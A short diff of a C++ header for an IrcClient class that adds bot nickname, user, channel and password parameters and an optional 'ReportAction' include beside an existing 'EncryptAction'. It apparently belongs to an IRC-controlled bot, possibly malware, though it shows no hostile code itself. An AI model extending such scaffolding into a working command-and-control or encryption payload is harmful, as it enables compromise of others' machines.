@@ -14,9 +14,13 @@
 #include "EncryptAction.hpp"
 #endif
 
+#ifdef ENABLE_REPORT_ACTION
+#include "ReportAction.hpp"
+#endif
+
 class IrcClient {
 public:
-    IrcClient(const char* server, int port, const char* exeName);
+    IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass);
     ~IrcClient();
     void connect();
     void sendCommand(const std::string& command);
@@ -28,6 +32,10 @@ private:
     bool registrationStatus;
     const char* server;
     int port;
+    std::string botNick;
+    std::string botUser;
+    std::string assignedChannel;
+    std::string botPass;
     irc_session_t* session;
     irc_callbacks_t callbacks;
 
